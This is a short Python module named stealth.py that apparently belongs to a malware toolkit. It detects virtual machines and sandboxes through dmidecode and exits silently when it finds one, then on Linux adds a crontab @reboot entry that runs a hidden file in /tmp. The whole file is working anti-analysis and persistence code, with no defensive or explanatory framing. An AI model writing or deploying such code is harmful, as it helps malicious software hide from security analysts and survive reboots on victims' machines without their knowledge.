# stealth.py — Persistence & Anti-Analysis Layer
import os
import platform
import subprocess
from rich import print, panel

def is_sandbox():
    known = ["VBox", "VMware", "QEMU"]
    sysinfo = subprocess.getoutput("dmidecode -s system-product-name")
    return any(k in sysinfo for k in known)

def setup_cron():
    cron_line = "@reboot python3 /tmp/.lune &"
    try:
        current = subprocess.getoutput("crontab -l")
        if cron_line not in current:
            updated = current + f"\n{cron_line}\n"
            subprocess.run("crontab -", input=updated.encode(), shell=True)
            print("[green]Cron persistence set.[/green]")
    except Exception as e:
        print(f"[red]Cron setup failed:[/red] {e}")

def run():
    print(panel.Panel("\U0001F575 [bold magenta]STEALTH[/bold magenta] — Environment Evasion + Persistence"))
    if is_sandbox():
        print("[yellow]Sandbox detected — exiting silently.[/yellow]")
        return
    if platform.system() == "Linux":
        setup_cron()
    print("[green]Stealth module complete.[/green]")


main = run
